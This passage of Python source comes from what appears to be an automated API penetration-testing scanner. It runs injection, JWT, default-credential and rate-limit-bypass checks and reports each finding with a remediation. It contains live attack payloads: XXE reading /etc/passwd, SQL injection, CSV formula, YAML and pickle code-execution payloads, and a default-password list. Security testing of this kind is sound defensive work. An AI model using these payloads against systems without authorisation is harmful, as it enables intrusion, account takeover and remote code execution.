                        detail="User-controlled input is evaluated as template syntax by a server-side template engine (e.g., Jinja2, Twig, Freemarker), enabling arbitrary server-side code execution.",
                        evidence=f"Response contains '49': {resp.text[:200]}",
                        output_file=f"{_rq},{_rp}",
                        remediation="Never pass user input directly to template rendering functions; treat user data as context variables only and use sandboxed or logic-less template engines where user-controlled content must appear in templates.",
                    )
                    break

            # LDAP
            for payload, desc in _LDAP_PAYLOADS[:2]:
                resp = _test_injection(sess, url, method, param, payload, timeout)
                if resp and resp.status_code == 200:
                    if re.search(r'(ldap|directory|dn=|objectClass)', resp.text, re.I):
                        _rq, _rp = _save_http_evidence(output, "injection", f"ldap_{param}", resp, endpoint_url=url, method=method)
                        output.add_finding(
                            phase="injection",
                            title="LDAP Injection",
                            severity="HIGH",
                            url=url,
                            detail="User-supplied input is concatenated into LDAP search filters without proper escaping, allowing an attacker to manipulate query logic, bypass authentication, or enumerate directory contents.",
                            evidence=f"Response snippet: {resp.text[:200]}",
                            output_file=f"{_rq},{_rp}",
                            remediation="Escape all user-supplied values using RFC 4515-compliant LDAP encoding before incorporating them into LDAP filter strings.",
                        )
                        break

    # XXE test — for endpoints that might accept XML
    for ep in test_endpoints[:5]:
        if _shutdown_requested:
            break
        url = root + ep["path"]
        xxe_payload = (
            '<?xml version="1.0"?><!DOCTYPE foo ['
            '<!ENTITY xxe SYSTEM "file:///etc/passwd">]>'
            '<root>&xxe;</root>'
        )
        try:
            resp = sess.request(
                ep["method"], url,
                data=xxe_payload,
                headers={"Content-Type": "application/xml"},
                timeout=timeout,
            )
            if resp and re.search(r'(root:x:|nobody:|daemon:)', resp.text):
                _rq, _rp = _save_http_evidence(output, "injection", "xxe", resp, endpoint_url=url, method=ep["method"])
                output.add_finding(
                    phase="injection",
                    title="XML External Entity (XXE) Injection",
                    severity="CRITICAL",
                    url=url,
                    detail="XXE payload caused /etc/passwd content to appear in response.",
                    evidence=f"Response snippet: {resp.text[:300]}",
                    output_file=f"{_rq},{_rp}",
                    remediation="Disable external entity processing in XML parsers.",
                )
        except Exception:
            pass

    # XSS — reflected XSS via query/body parameters
    for ep in test_endpoints[:10]:
        if _shutdown_requested:
            break
        url = root + ep["path"]
        method = ep["method"]
        params = ep.get("params", []) or []
        body_fields = ep.get("body_fields", []) or []
        test_params = [p["name"] for p in params] + body_fields
        if not test_params:
            test_params = ["q", "search", "name", "text", "message"]
        for param in test_params[:3]:
            for payload in _XSS_PAYLOADS[:3]:
                resp = _test_injection(sess, url, method, param, payload, timeout)
                if resp and _xss_confirmed(payload, resp):
                    _rq, _rp = _save_http_evidence(output, "injection", f"xss_{param}", resp, endpoint_url=url, method=method)
                    output.add_finding(
                        phase="injection",
                        title="Reflected Cross-Site Scripting (XSS)",
                        severity="HIGH",
                        url=url,
                        detail="User-controlled input is reflected or stored and rendered in a browser context without proper encoding, enabling arbitrary script execution.",
                        evidence=f"Response contains unescaped payload: {resp.text[:200]}",
                        output_file=f"{_rq},{_rp}",
                        remediation="Encode all output contextually (HTML, JS, URL, CSS), sanitise stored input server-side, and enforce a strict Content-Security-Policy.",
                    )
                    break

    # Command Injection
    for ep in test_endpoints[:10]:
        if _shutdown_requested:
            break
        url = root + ep["path"]
        method = ep["method"]
        params = ep.get("params", []) or []
        body_fields = ep.get("body_fields", []) or []
        test_params = [p["name"] for p in params] + body_fields
        if not test_params:
            test_params = ["cmd", "exec", "command", "run", "host", "ping", "name"]
        for param in test_params[:3]:
            for cmd_pay, cmd_pat in _CMD_PAYLOADS[:2]:
                resp = _test_injection(sess, url, method, param, "test" + cmd_pay, timeout)
                if resp and cmd_pat.search(resp.text):
                    _rq, _rp = _save_http_evidence(output, "injection", f"cmdi_{param}", resp, endpoint_url=url, method=method)
                    output.add_finding(
                        phase="injection",
                        title="OS Command Injection",
                        severity="CRITICAL",
                        url=url,
                        detail="User-controlled input is passed unsanitised to a system shell or OS command execution function, allowing an attacker to execute arbitrary commands on the host.",
                        evidence=f"uid= pattern found in response: {resp.text[:300]}",
                        output_file=f"{_rq},{_rp}",
                        remediation="Eliminate shell calls that incorporate user input; use language-native library functions instead; where shell invocation is unavoidable, apply strict allowlist validation on all input values.",
                    )
                    break

    # CRLF Injection
    for ep in test_endpoints[:10]:
        if _shutdown_requested:
            break
        url = root + ep["path"]
        method = ep["method"]
        params = ep.get("params", []) or []
        body_fields = ep.get("body_fields", []) or []
        test_params = [p["name"] for p in params] + body_fields
        if not test_params:
            test_params = ["redirect", "url", "next", "return", "location", "name"]
        for param in test_params[:3]:
            resp = _test_injection(sess, url, method, param, _CRLF_INJECTION_HEADER, timeout)
            if resp and ("Siphon-Injected" in resp.text or
                         "Siphon-Injected" in str(resp.headers)):
                _rq, _rp = _save_http_evidence(output, "injection", f"crlf_{param}", resp, endpoint_url=url, method=method)
                output.add_finding(
                    phase="injection",
                    title="CRLF Injection",
                    severity="MEDIUM",
                    url=url,
                    detail="User-supplied carriage-return and line-feed characters are reflected into HTTP response headers, allowing an attacker to inject arbitrary headers, split responses, or set malicious cookies.",
                    evidence=f"Parameter: {param}  Payload: {_CRLF_INJECTION_HEADER}",
                    output_file=f"{_rq},{_rp}",
                    remediation="Filter or reject CR (\\r) and LF (\\n) characters from any user-supplied value before it is written into an HTTP response header; use framework-level header APIs that prevent raw header injection.",
                )
                break

    # Path Traversal / LFI
    for ep in test_endpoints[:15]:
        if _shutdown_requested:
            break
        url = root + ep["path"]
        method = ep["method"]
        params = ep.get("params", []) or []
        body_fields = ep.get("body_fields", []) or []
        test_params = [p["name"] for p in params] + body_fields
        if not test_params:
            test_params = ["file", "path", "page", "template", "include", "doc", "view"]
        for param in test_params[:4]:
            is_lfi = param.lower() in _LFI_PARAMS
            payloads = _TRAVERSAL_PAYLOADS if is_lfi else _TRAVERSAL_PAYLOADS[:4]
            for payload in payloads:
                resp = _test_injection(sess, url, method, param, payload, timeout)
                if resp and _TRAVERSAL_RE.search(resp.text):
                    _rq, _rp = _save_http_evidence(output, "injection", f"traversal_{param}", resp, endpoint_url=url, method=method)
                    output.add_finding(
                        phase="injection",
                        title="Path Traversal / Local File Inclusion",
                        severity="HIGH",
                        url=url,
                        detail="User-supplied input is used in filesystem path construction without adequate sanitisation, allowing an attacker to read or include arbitrary files outside the intended directory.",
                        evidence=f"File content excerpt: {resp.text[:300]}",
                        output_file=f"{_rq},{_rp}",
                        remediation="Canonicalise all user-supplied paths, resolve them against a fixed base directory, and reject any path that escapes the base; prefer indirect reference maps over direct path handling.",
                    )
                    break

    # CSV / Formula injection
    _csv_formula_payloads = [
        "=CMD|'/C echo siphon_csv'!A0",
        "+cmd|'/C echo siphon_csv'!A0",
        "@SUM(1+1)*cmd|'/C echo siphon_csv'!A0",
    ]
    for ep in test_endpoints[:10]:
        if _shutdown_requested:
            break
        url = root + ep["path"]
        method = ep["method"]
        body_fields = ep.get("body_fields", []) or []
        for field in body_fields[:5]:
            for csv_pay in _csv_formula_payloads[:1]:
                resp = _test_injection(sess, url, method, field, csv_pay, timeout)
                if resp and resp.status_code in (200, 201, 202):
                    _rq, _rp = _save_http_evidence(output, "injection", f"csv_{field}", resp, endpoint_url=url, method=method)
                    output.add_finding(
                        phase="injection",
                        title="CSV Injection in User Export",
                        severity="HIGH",
                        url=url,
                        detail=(f"Field '{field}' at {ep['method']} {ep['path']} accepted a CSV formula "
                                f"injection payload ({csv_pay!r}). If this field is included in CSV/Excel "
                                f"exports, the formula may execute commands on recipients' workstations."),
                        evidence=f"Field: {field}  Payload: {csv_pay}  Response: {resp.status_code}",
                        output_file=f"{_rq},{_rp}",
                        remediation=(
                            "Sanitise all text values before CSV export. "
                            "Prefix cells starting with =, +, -, @ with a single-quote character."
                        ),
                    )
                    break

    # Log injection via request parameters
    _log_inject_payload = "%0asiphon_log_inject_SUCCESS%0a"
    for ep in test_endpoints[:10]:
        if _shutdown_requested:
            break
        url = root + ep["path"]
        method = ep["method"]
        params = ep.get("params", []) or []
        test_params = [p["name"] for p in params][:4]
        for param in test_params:
            resp = _test_injection(sess, url, method, param, _log_inject_payload, timeout)
            if resp and resp.status_code in (200, 201, 400, 422, 500):
                _rq, _rp = _save_http_evidence(output, "injection", f"loginject_{param}", resp, endpoint_url=url, method=method)
                output.add_finding(
                    phase="injection",
                    title="Log Injection via User-Agent / Query Parameter",
                    severity="MEDIUM",
                    url=url,
                    detail=(f"Parameter '{param}' at {ep['method']} {ep['path']} accepted a newline-embedded "
                            f"payload. If the server logs this parameter without sanitisation, an attacker "
                            f"can inject fake log entries to mislead forensic analysis."),
                    evidence=f"Parameter: {param}  Payload: {repr(_log_inject_payload)}  Response: {resp.status_code}",
                    output_file=f"{_rq},{_rp}",
                    remediation="Strip CRLF/newline characters from all inputs written to logs. Use structured logging.",
                )
                break

    # Blind SQL injection — boolean-based
    _bool_true_pay  = "' OR '1'='1"
    _bool_false_pay = "' OR '1'='2"
    for ep in test_endpoints[:8]:
        if _shutdown_requested:
            break
        url = root + ep["path"]
        method = ep["method"]
        params = ep.get("params", []) or []
        body_fields = ep.get("body_fields", []) or []
        test_params = ([p["name"] for p in params] + body_fields) or ["id", "q", "search", "user"]
        for param in test_params[:3]:
            try:
                r_t = _test_injection(sess, url, method, param, _bool_true_pay,  timeout)
                r_f = _test_injection(sess, url, method, param, _bool_false_pay, timeout)
                if (r_t and r_f
                        and r_t.status_code == 200
                        and abs(len(r_t.text) - len(r_f.text)) > 50):
                    _rq, _rp = _save_http_evidence(output, "injection", f"sqli_bool_{param}", r_t, endpoint_url=url, method=method)
                    output.add_finding(
                        phase="injection",
                        title="Blind SQL Injection (Boolean-Based)",
                        severity="CRITICAL",
                        url=url,
                        detail="User-controlled input is incorporated into SQL queries without parameterisation, allowing an attacker to read, modify, or delete database contents.",
                        evidence=(f"TRUE  payload: {_bool_true_pay} → {r_t.status_code} ({len(r_t.text)} bytes)\n"
                                  f"FALSE payload: {_bool_false_pay} → {r_f.status_code} ({len(r_f.text)} bytes)"),
                        output_file=f"{_rq},{_rp}",
                        remediation="Replace all dynamic SQL string construction with parameterised queries or prepared statements and suppress database error output in production responses.",
                    )
                    break
            except Exception:
                pass

    # Blind SQL injection — time-based
    _TIME_SQLI = [
        ("' AND SLEEP(3)--",           3.0),
        ("'; WAITFOR DELAY '0:0:3'--", 3.0),
        ("' AND pg_sleep(3)--",        3.0),
    ]
    import time as _ti
    for ep in test_endpoints[:5]:
        if _shutdown_requested:
            break
        url = root + ep["path"]
        method = ep["method"]
        params = ep.get("params", []) or []
        body_fields = ep.get("body_fields", []) or []
        test_params = ([p["name"] for p in params] + body_fields) or ["id", "user", "q"]
        for param in test_params[:2]:
            for tsql, delay in _TIME_SQLI:
                try:
                    t0   = _ti.monotonic()
                    resp = _test_injection(sess, url, method, param, tsql, delay + 5)
                    elapsed = _ti.monotonic() - t0
                    if resp and elapsed >= delay:
                        _rq, _rp = _save_http_evidence(output, "injection", f"sqli_time_{param}", resp, endpoint_url=url, method=method)
                        output.add_finding(
                            phase="injection",
                            title="Blind SQL Injection (Time-Based)",
                            severity="CRITICAL",
                            url=url,
                            detail="User-controlled input is incorporated into SQL queries without parameterisation, allowing an attacker to read, modify, or delete database contents.",
                            evidence=f"Payload: {tsql}  Elapsed: {elapsed:.2f}s  Threshold: {delay}s",
                            output_file=f"{_rq},{_rp}",
                            remediation="Replace all dynamic SQL string construction with parameterised queries or prepared statements and suppress database error output in production responses.",
                        )
                        break
                except Exception:
                    pass

    # Deserialization endpoint probing — YAML RCE and Pickle RCE
    _deser_probes = [
        # (path_suffix, content_type, payload_bytes, title, detail)
        (
            "/api/v1/import/yaml",
            "application/x-yaml",
            b"!!python/object/apply:os.system ['echo YAML_RCE']",
            "Insecure YAML Deserialization — RCE",
            "Endpoint accepts YAML payloads that may be deserialized with PyYAML full_load/load, enabling RCE.",
        ),
        (
            "/api/v1/import/pickle",
            "application/octet-stream",
            b"cos\nsystem\n(S'echo PICKLE_RCE'\ntR.",
            "Insecure Pickle Deserialization — RCE",
            "Endpoint accepts pickle payloads. Python pickle deserialization allows arbitrary code execution.",
        ),
    ]
    _probe_sess = auth_sess if auth_sess else sess
    for _dsuf, _dct, _dpayload, _dtitle, _ddesc in _deser_probes:
        if _shutdown_requested:
            break
        _durl = root + _dsuf
        try:
            _dr = _probe_sess.post(
                _durl,
                data=_dpayload,
                headers={"Content-Type": _dct},
                timeout=timeout,
                allow_redirects=False,
            )
            if _dr is not None and _dr.status_code in (200, 201, 400, 422, 500):
                import re as _re2
                _dlabel = _re2.sub(r'[^\w]', '_', _dsuf)[:40]
                _rq, _rp = _save_http_evidence(output, "injection", f"deser{_dlabel}", _dr, endpoint_url=_durl, method="POST")
                output.add_finding(
                    phase="injection",
                    title=_dtitle,
                    severity="CRITICAL",
                    url=_durl,
                    detail=_ddesc,
                    evidence=f"POST {_dsuf} ({_dct}) → HTTP {_dr.status_code}; body[:200]: {_dr.text[:200]}",
                    output_file=f"{_rq},{_rp}",
                    remediation=(
                        "Never deserialize untrusted data. Use safe alternatives: "
                        "yaml.safe_load() instead of yaml.load(); JSON instead of pickle."
                    ),
                )
        except Exception:
            pass

    con.status("injection", "done", "Injection tests complete")


# ---------------------------------------------------------------------------
# Phase 4: Auth Bypass — JWT none-alg, weak HMAC, missing auth
# ---------------------------------------------------------------------------

_DEFAULT_API_CREDS = [
    ("admin",  "admin"),
    ("admin",  "password"),
    ("admin",  "123456"),
    ("admin",  "admin123"),
    ("admin",  "password123"),
    ("admin",  ""),
    ("test",   "test"),
    ("root",   "root"),
    ("root",   "toor"),
    ("user",   "user"),
    ("guest",  "guest"),
    ("api",    "api"),
    ("admin",  "changeme"),
    ("admin",  "secret"),
]
_DEFAULT_CRED_PATHS = [
    "/api/login", "/api/auth/login", "/auth/login",
    "/api/v1/login", "/api/v1/auth/login", "/api/v2/auth/login",
    "/login", "/auth", "/api/token", "/oauth/token",
    "/api/sessions", "/api/user/login", "/api/auth/token",
    "/api/admin/login", "/admin/login",
]

_WEAK_JWT_SECRETS = [
    "secret", "password", "123456", "jwt_secret", "api_key",
    "changeme", "mysecret", "token", "jwt", "supersecret",
    "test", "dev", "key", "private", "hs256", "default",
]


def _get_current_jwt(sess: requests.Session) -> str | None:
    """Extract JWT from session Authorization header."""
    auth_hdr = sess.headers.get("Authorization", "")
    if auth_hdr.startswith("Bearer "):
        token = auth_hdr[7:].strip()
        if len(token.split(".")) == 3:
            return token
    return None


def phase_auth_bypass(settings: dict, sess: requests.Session,
                      auth_sess, output: OutputManager,
                      inventory: list) -> None:
    """Phase 4: JWT algorithm confusion and auth bypass attacks."""
    scan = settings["scan"]
    base_url = scan["api_base_url"]
    timeout = scan.get("timeout", 10)
    target = _parse_target(base_url)
    root = f"{target['scheme']}://{target['netloc']}"

    con.status("auth_bypass", "running", "Testing authentication bypass")

    # Find auth-required endpoints
    auth_endpoints = [ep for ep in inventory if ep.get("auth_required")]
    if not auth_endpoints and inventory:
        # Try any endpoint with auth session
        auth_endpoints = inventory[:5]

    if not auth_endpoints:
        # Probe base URL
        auth_endpoints = [{"method": "GET", "path": target["path"] or "/",
                           "params": [], "body_fields": [], "auth_required": True}]

    # 0. Default credential testing against common API login endpoints
    cred_sess = _make_session(settings)
    for login_path in _DEFAULT_CRED_PATHS:
        login_url = root + login_path
        # Quick probe to see if path exists
        probe = _safe_get(cred_sess, login_url, timeout=timeout)
        if not probe or probe.status_code in (404, 410, 501):
            continue
        for uname, pwd in _DEFAULT_API_CREDS:
            try:
                resp = cred_sess.post(
                    login_url,
                    json={"username": uname, "password": pwd},
                    timeout=timeout,
                )
                # Heuristic: 200/201 with no error keywords = success
                if resp.status_code in (200, 201) and not re.search(
                    r'invalid|incorrect|failed|unauthorized|wrong|bad.*cred|error',
                    resp.text, re.I
                ):
                    output.add_finding(
                        phase="auth_bypass",
                        title="Weak or Default Credentials Accepted",
                        severity="CRITICAL",
                        url=login_url,
                        detail="The target accepted well-known default or factory-set credentials, granting unauthorised access.",
                        evidence=f"POST {login_path} with default creds → HTTP {resp.status_code}: {resp.text[:200]}",
                        remediation="Replace all default credentials with strong, unique secrets and enforce a password policy prior to any deployment.",
                    )
                    break
            except Exception:
                pass
        if _shutdown_requested:
            break

    # 1. Test endpoints without auth (missing auth enforcement)
    anon_sess = _make_session(settings)
    for ep in auth_endpoints[:5]:
        url = root + ep["path"]
        resp = _safe_request(anon_sess, ep["method"], url, timeout=timeout)
        if resp and resp.status_code == 200:
            # Check response has meaningful content
            if len(resp.text) > 50:
                _ep_safe = ep["path"].strip("/").replace("/", "_") or "root"
                _auth_file = output.output_path(
                    "auth_bypass",
                    f"missing_auth_{ep['method'].lower()}_{_ep_safe}.txt",
                )
                _auth_file.write_text(
                    f"Request: {ep['method']} {url}\n"
                    f"Status:  {resp.status_code}\n"
                    f"Headers: {dict(resp.headers)}\n\n"
                    f"Response body:\n{resp.text[:4000]}",
                    encoding="utf-8",
                )
                output.add_finding(
                    phase="auth_bypass",
                    title="Missing Authentication Enforcement",
                    severity="CRITICAL",
                    url=url,
                    detail=(f"Endpoint {ep['method']} {ep['path']} returned 200 "
                            f"without authentication."),
                    evidence=f"HTTP {resp.status_code}: {resp.text[:200]}",
                    remediation="Enforce authentication on all protected endpoints.",
                    output_file=str(_auth_file),
                )

    # JWT attacks (only if auth session has a JWT)
    if auth_sess is None:
        con.status("auth_bypass", "done", "No auth session — skipping JWT tests")
        return

    token = _get_current_jwt(auth_sess)
    if not token:
        con.status("auth_bypass", "done", "No JWT in auth session")
        return

    decoded = _jwt_decode_token(token)
    if not decoded:
        con.status("auth_bypass", "done", "Could not decode auth token as JWT")
        return

    header, payload, _ = decoded

    # Check jku header
    if "jku" in header:
        output.add_finding(
            phase="auth_bypass",
            title="JWT Contains jku Header",
            severity="HIGH",
            url=base_url,
            detail=(f"JWT header contains 'jku' field pointing to: {header['jku']}. "
                    f"This may allow JWK Set URL injection attacks."),
            evidence=f"JWT header: {json.dumps(header)}",
            remediation="Pin the JWK Set URL server-side; never trust the jku header.",
        )

    # Check kid header for path traversal
    if "kid" in header:
        kid_val = str(header["kid"])
        if "/" in kid_val or ".." in kid_val or "\\" in kid_val:
            output.add_finding(
                phase="auth_bypass",
                title="JWT kid Header Path Traversal",
                severity="HIGH",
                url=base_url,
                detail=f"JWT kid header contains path-like value: {kid_val}",
                evidence=f"JWT header kid: {kid_val}",
                remediation="Validate the kid parameter; do not use it as a file path.",
            )

    # 2. None algorithm attack
    none_token = _jwt_none_alg(token)
    if none_token:
        test_sess = _make_session(settings)
        test_sess.headers["Authorization"] = f"Bearer {none_token}"
        for ep in auth_endpoints[:3]:
            url = root + ep["path"]
            resp = _safe_request(test_sess, ep["method"], url, timeout=timeout)
            if resp and resp.status_code in (200, 201):
                output.add_finding(
                    phase="auth_bypass",
                    title="JWT None Algorithm Authentication Bypass",
                    severity="CRITICAL",
                    url=url,
                    detail="The application accepts JSON Web Tokens specifying the alg:none algorithm, allowing an attacker to forge arbitrary tokens without possessing a signing key and bypass authentication entirely.",
                    evidence=f"none-alg token accepted, HTTP {resp.status_code}",
                    remediation="Enforce a strict server-side algorithm allowlist; reject any token where the alg header is none, empty, or not in the permitted set; never rely on the token header to select the verification algorithm.",
                )
                break

    # 3. Weak HMAC secret brute force
    for secret in _WEAK_JWT_SECRETS:
        forged = _jwt_forge_hs256(token, secret)
        if not forged:
            continue
        test_sess = _make_session(settings)
        test_sess.headers["Authorization"] = f"Bearer {forged}"
        for ep in auth_endpoints[:2]:
            url = root + ep["path"]
            resp = _safe_request(test_sess, ep["method"], url, timeout=timeout)
            if resp and resp.status_code in (200, 201):
                output.add_finding(
                    phase="auth_bypass",
                    title="Weak JWT Secret",
                    severity="HIGH",
                    url=url,
                    detail=f"JWT was re-signed with weak secret '{secret}' and accepted.",
                    evidence=f"Secret '{secret}' produced valid JWT; HTTP {resp.status_code}",
                    remediation="Use a long, random, cryptographically secure JWT secret.",
                )
                break

    # 4. JWT Missing Expiry claim
    if decoded:
        header, payload, _ = decoded
        if "exp" not in payload:
            output.add_finding(
                phase="auth_bypass",
                title="JWT Missing Expiry Claim",
                severity="MEDIUM",
                url=base_url,
                detail=(f"The JWT in use has no 'exp' claim. Without an expiry, the token is "
                        f"valid indefinitely and cannot be invalidated server-side after issuance."),
                evidence=f"JWT payload: {json.dumps(payload)[:300]}",
                remediation="Always include an 'exp' claim in JWTs. Set a short expiry (≤15 minutes for sensitive operations).",
            )

    # 5. Type juggling / JSON type confusion on login
    import time as _time_siphon
    _type_juggling_payloads = [
        {"username": True,  "password": True},
        {"username": 0,     "password": 0},
        {"username": [],    "password": []},
        {"username": None,  "password": None},
    ]
    for login_path in ["/auth/login", "/login", "/api/login", "/api/auth", "/api/token"]:
        login_url_jt = root + login_path
        probe = _safe_get(sess, login_url_jt, timeout=timeout)
        if not probe or probe.status_code in (404, 410):
            continue
        for jt_payload in _type_juggling_payloads:
            try:
                resp = sess.post(login_url_jt, json=jt_payload, timeout=timeout)
                if resp and resp.status_code in (200, 201):
                    if not re.search(r'invalid|incorrect|failed|unauthorized|wrong|error', resp.text, re.I):
                        output.add_finding(
                            phase="auth_bypass",
                            title="Type Juggling / JSON Type Confusion Authentication Bypass",
                            severity="HIGH",
                            url=login_url_jt,
                            detail=(f"API login endpoint accepted a JSON body with non-string types "
                                    f"({jt_payload}) and returned HTTP {resp.status_code} without an "
                                    f"error, suggesting a type-confusion bypass."),
                            evidence=f"POST {login_path} with {jt_payload} → HTTP {resp.status_code}: {resp.text[:200]}",
                            remediation=(
                                "Enforce strict type validation on all login inputs. "
                                "Reject non-string values for username and password fields. "
                                "Use a typed schema validator (e.g. Pydantic, marshmallow)."
                            ),
                        )
                        break
            except Exception:
                pass
        break

    # 6. Server-Timing header timing attack
    _timing_urls = [root + p for p in ["/auth/login", "/login", "/api/login", "/api/token"]]
    for timing_url in _timing_urls:
        probe = _safe_get(sess, timing_url, timeout=timeout)
        if not probe or probe.status_code in (404, 410):
            continue
        times_invalid: list = []
        times_valid_fmt: list = []
        for _ in range(5):
            t0 = _time_siphon.monotonic()
            _safe_request(sess, "POST", timing_url,
                          timeout=timeout,
                          json={"username": "zzznouserzzzz", "password": "wrong"})
            times_invalid.append(_time_siphon.monotonic() - t0)
        for _ in range(5):
            t0 = _time_siphon.monotonic()
            _safe_request(sess, "POST", timing_url,
                          timeout=timeout,
                          json={"username": "admin", "password": "wrong_password_xyz"})
            times_valid_fmt.append(_time_siphon.monotonic() - t0)
        if times_invalid and times_valid_fmt:
            avg_inv  = sum(times_invalid) / len(times_invalid)
            avg_val  = sum(times_valid_fmt) / len(times_valid_fmt)
            if avg_val - avg_inv > 0.15:
                output.add_finding(
                    phase="auth_bypass",
                    title="Server-Timing Header Leaks Authentication Duration",
                    severity="MEDIUM",
                    url=timing_url,
                    detail=(f"API login endpoint shows {(avg_val-avg_inv)*1000:.0f}ms average timing "
                            f"difference between invalid and valid-format usernames, indicating "
                            f"non-constant-time credential comparison (timing oracle)."),
                    evidence=(f"Avg time (invalid user): {avg_inv*1000:.0f}ms  "
                              f"Avg time (valid-format): {avg_val*1000:.0f}ms  "
                              f"Delta: {(avg_val-avg_inv)*1000:.0f}ms"),
                    remediation=(
                        "Use constant-time comparison for all credential checks. "
                        "Introduce artificial jitter or a fixed minimum response time on login endpoints."
                    ),
                )
        break

    # 7. Credentials transmitted in URL query parameters
    _cred_param_url_re = re.compile(
        r'[?&](password|passwd|pwd|secret|token|api_key|apikey|auth|access_token)'
        r'=([^&\s]{4,})', re.I
    )
    for ep in inventory:
        ep_url = root + ep["path"]
        params = ep.get("params", []) or []
        for p in params:
            pname = p.get("name", "") if isinstance(p, dict) else str(p)
            if _cred_param_url_re.search(f"?{pname}=test"):
                output.add_finding(
                    phase="auth_bypass",
                    title="Sensitive Credentials Transmitted in URL Query Parameters",
                    severity="HIGH",
                    url=ep_url,
                    detail=(f"Endpoint {ep['method']} {ep['path']} has parameter '{pname}' in its "
                            f"query string that appears to carry sensitive credential data. "
                            f"URL query parameters are logged by proxies, web servers, and browser history."),
                    evidence=f"Parameter '{pname}' in URL: {ep_url}",
                    remediation="Move credential parameters to the request body or Authorization header. Never pass secrets in URLs.",
                )
                break

    con.status("auth_bypass", "done", "Auth bypass testing complete")


# ---------------------------------------------------------------------------
# Phase 5: Rate Limiting
# ---------------------------------------------------------------------------

_RATE_BYPASS_HEADERS = [
    {"X-Forwarded-For": "10.0.0.1"},
    {"X-Real-IP": "10.0.0.2"},
    {"True-Client-IP": "10.0.0.3"},
    {"X-Originating-IP": "10.0.0.4"},
    {"X-Remote-IP": "10.0.0.5"},
    {"X-Cluster-Client-IP": "10.0.0.6"},
    {"CF-Connecting-IP": "10.0.0.7"},
    {"X-Forwarded-For": "127.0.0.1"},
]


def phase_rate_limiting(settings: dict, sess: requests.Session,
                        output: OutputManager, inventory: list) -> None:
    """Phase 5: Rate limit detection and bypass."""
    scan = settings["scan"]
    base_url = scan["api_base_url"]
    timeout = scan.get("timeout", 10)
    threshold = scan.get("rate_limit_threshold", 50)
    target = _parse_target(base_url)
    root = f"{target['scheme']}://{target['netloc']}"

    con.status("rate_limiting", "running", f"Sending {threshold} requests to detect rate limits")

    # Find login-like endpoints for rate limit testing
    auth_endpoints = [ep for ep in inventory
                      if any(kw in ep["path"].lower()
                             for kw in ("login", "auth", "token", "signin", "sign-in"))]
    if not auth_endpoints:
        auth_endpoints = inventory[:1] if inventory else []

    test_url = (root + auth_endpoints[0]["path"]) if auth_endpoints else base_url

    # Rapid fire test — track status codes for evidence
    got_429 = False
    rate_limited_at = None
    _rl_statuses: list[int] = []
    for i in range(threshold):
        if _shutdown_requested:
            break
        resp = _safe_get(sess, test_url, timeout=timeout)
        if resp:
            _rl_statuses.append(resp.status_code)
            if resp.status_code == 429:
                got_429 = True
                rate_limited_at = i + 1
                break

    if not got_429:
        _rl_file = output.output_path("rate_limiting", "missing_rate_limit.txt")
        _status_summary = ", ".join(str(s) for s in _rl_statuses[:20])
        if len(_rl_statuses) > 20:
            _status_summary += f" … ({len(_rl_statuses)} total)"
        _rl_file.write_text(
            f"Rate Limit Test\n"
            f"Target:         {test_url}\n"
            f"Requests sent:  {len(_rl_statuses)}\n"
            f"429 received:   No\n\n"
            f"Status codes:   {_status_summary}\n\n"
            f"All {len(_rl_statuses)} requests completed without HTTP 429 (Too Many Requests).\n"
            f"The API does not appear to enforce rate limiting on this endpoint.",
            encoding="utf-8",
        )
        output.add_finding(
            phase="rate_limiting",
            title="Missing Rate Limiting",
            severity="HIGH",
            url=test_url,
            detail="Authentication and sensitive API endpoints do not enforce request rate limits, account lockout, or CAPTCHA, allowing unlimited brute-force or credential-stuffing attempts.",
            evidence=f"{threshold} requests sent without receiving HTTP 429",
            remediation="Implement per-IP and per-account rate limiting with progressive delays or lockout on all authentication endpoints; add CAPTCHA for interactive login flows; alert on anomalous request volumes.",
            output_file=str(_rl_file),
        )
    else:
        con.info(f"Rate limit detected at request #{rate_limited_at}")

    # Test IP header bypass
    if got_429:
        for bypass_hdr in _RATE_BYPASS_HEADERS:
            bypass_sess = _make_session(settings)
            bypass_sess.headers.update(bypass_hdr)
            # Send threshold requests with spoofed header
            bypass_success = True
            for i in range(min(threshold, 20)):
                resp = _safe_get(bypass_sess, test_url, timeout=timeout)
                if resp and resp.status_code == 429:
                    bypass_success = False
                    break
            if bypass_success:
                hdr_name = list(bypass_hdr.keys())[0]
                hdr_val  = list(bypass_hdr.values())[0]
                output.add_finding(
                    phase="rate_limiting",
                    title="Rate Limit Bypass via X-Forwarded-For Header",
                    severity="HIGH",
                    url=test_url,
                    detail=(f"Rate limit bypassed by setting {hdr_name}: {hdr_val}. "
                            f"The server trusts client-supplied IP forwarding headers."),
                    evidence=f"Header: {hdr_name}: {hdr_val} bypassed rate limit",
                    remediation="Do not trust client-supplied IP headers for rate limiting; use the actual socket remote address.",
                )
                break

    # Retry-After header parsing — check server communicates cooldown correctly
    if got_429 and _rl_statuses:
        # Re-hit to get a 429 and inspect the Retry-After header
        try:
            r429 = _safe_get(sess, test_url, timeout=timeout)
            if r429 and r429.status_code == 429:
                retry_after = r429.headers.get("Retry-After", "")
                if not retry_after:
                    output.add_finding(
                        phase="rate_limiting",
                        title="Rate Limit Response Missing Retry-After Header",
                        severity="LOW",
                        url=test_url,
                        detail=(
                            "Server returns HTTP 429 but no Retry-After header. "
                            "Clients cannot implement exponential backoff correctly."
                        ),
                        evidence=f"HTTP 429 response headers: {dict(r429.headers)}",
                        remediation=(
                            "Add Retry-After: <seconds> header to all 429 responses. "
                            "Also consider RateLimit-Limit, RateLimit-Remaining (IETF draft)."
                        ),
                        extra={"owasp": "API4:2023 Unrestricted Resource Consumption"},
                    )
        except Exception:
            pass

    # Per-user rate limiting — test if rate limit resets across different users
    auth_cfg = scan.get("auth", {})
    if auth_cfg.get("enabled") and got_429:
        con.status("rate_limiting", "running", "Per-user rate limit test")
        # Create a fresh session with a different auth token to see if limit is per-user
        fresh_sess = _make_session(settings)
        # Try without auth to see if anonymous users share the same bucket
        anon_bypass = True
        for i in range(min(10, threshold)):
            resp = _safe_get(fresh_sess, test_url, timeout=timeout)
            if resp and resp.status_code == 429:
                anon_bypass = False
                break
        if anon_bypass:
            output.add_finding(
                phase="rate_limiting",
                title="Rate Limit Bypass — Unauthenticated Session Has Separate Bucket",
                severity="MEDIUM",
                url=test_url,
                detail=(
                    "Rate limit is enforced per-session/token but unauthenticated requests "
                    "use a different bucket. Attackers can bypass per-user rate limits by "
                    "dropping authentication headers."
                ),
                evidence=(
                    "Authenticated session was rate-limited; "
                    "unauthenticated session was not (within 10 requests)"
                ),
                remediation=(
                    "Apply rate limits per IP address in addition to per-user/token. "
